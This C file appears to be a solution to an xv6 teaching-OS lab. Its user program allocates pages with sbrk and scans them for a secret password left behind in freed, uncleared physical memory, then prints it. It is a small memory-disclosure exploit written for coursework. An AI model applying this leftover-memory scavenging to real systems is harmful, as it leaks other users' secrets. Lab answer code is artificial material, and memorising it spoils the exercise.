#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int strncmp(const char *str1, const char *str2, int n);
// kalloc.c 的 kfree 函数里把物理页的开头换成了一个指针.
// 所以我们丢失了开头的 sizeof(指针) 个字符.
const int overwrite_len = sizeof(void *);

int main(int argc, char *argv[]) {
    // your code here.  you should write the secret to fd 2 using write
    // (e.g., write(2, secret, 8)
    char *end;
    char *prefix = "my very very very secret pw is: ";
    int cmplen = strlen(prefix) - overwrite_len;

    // 遍历新插入的32个物理页
    for (int i = 0; i < 32; i++) {
        end = sbrk(PGSIZE);
        if (strncmp(end + overwrite_len, prefix + overwrite_len, cmplen) == 0) {
            write(2, end + 32, 8);
            exit(0);
        }
    }
    exit(1);
}

int strncmp(const char *str1, const char *str2, int n) {
    while (n > 0) {
        if (*str1 != *str2) {
            return (*str1 - *str2);
        }
        if (*str1 == '\0') {
            return 0;
        }
        str1++;
        str2++;
        n--;
    }
    return 0;
}